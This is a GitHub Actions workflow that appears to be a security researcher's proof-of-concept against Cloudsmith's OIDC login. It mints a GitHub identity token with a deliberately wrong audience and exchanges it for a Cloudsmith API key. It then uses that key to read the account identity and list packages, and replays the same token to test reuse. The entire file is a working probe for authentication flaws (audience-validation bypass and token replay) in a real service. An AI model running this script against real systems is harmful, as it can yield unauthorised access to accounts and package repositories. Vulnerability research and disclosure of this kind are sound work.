name: cloudsmith-oidc-test
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  oidc-test:
    runs-on: ubuntu-latest
    steps:
      - name: Exchange wrong-audience token and USE it
        run: |
          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=totally-wrong-audience" | jq -r .value)
          echo "oidc aud: $(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq -r .aud)"
          CS=$(curl -sS -X POST "https://api.cloudsmith.io/openid/cstestorg-cangns/" \
            -H "Content-Type: application/json" \
            -d "{\"oidc_token\":\"$TOKEN\",\"service_slug\":\"research-svc\"}")
          CSTOKEN=$(echo "$CS" | jq -r .token)
          echo "exchange status: $(echo "$CS" | jq -r 'if .token then "GOT TOKEN" else . end')"
          echo "--- using cloudsmith token:"
          curl -sS -H "X-Api-Key: $CSTOKEN" "https://api.cloudsmith.io/v1/user/self/"
          echo
          echo "--- packages visible to this token:"
          curl -sS -H "X-Api-Key: $CSTOKEN" "https://api.cloudsmith.io/v1/packages/cstestorg-cangns/xsstest3/?page_size=3" | head -c 400
          echo
          echo "--- replay: exchange the SAME token again:"
          curl -sS -o /dev/null -w "second exchange HTTP:%{http_code}\n" -X POST \
            "https://api.cloudsmith.io/openid/cstestorg-cangns/" \
            -H "Content-Type: application/json" \
            -d "{\"oidc_token\":\"$TOKEN\",\"service_slug\":\"research-svc\"}"
